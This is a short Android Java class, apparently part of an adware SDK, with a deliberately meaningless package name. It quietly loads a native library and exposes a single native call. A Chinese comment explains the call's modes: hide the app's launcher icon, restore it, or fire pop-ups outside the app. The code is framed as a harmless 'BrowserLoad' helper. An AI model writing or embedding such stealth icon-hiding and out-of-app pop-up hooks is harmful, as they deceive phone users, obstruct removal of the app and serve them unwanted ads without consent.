package com.during.festival.rain.falls.one.zbrokloe;

import androidx.annotation.Keep;

@Keep
public class BrowserLoad {
    static {
        try {
            System.loadLibrary("puplemar");
        } catch (Exception e) {
        }
    }
    public static native String bload(String num,boolean c);//参数num:"nf"隐藏图标,"lk"恢复隐藏."gi"外弹(外弹在主进程主线程调用).

}
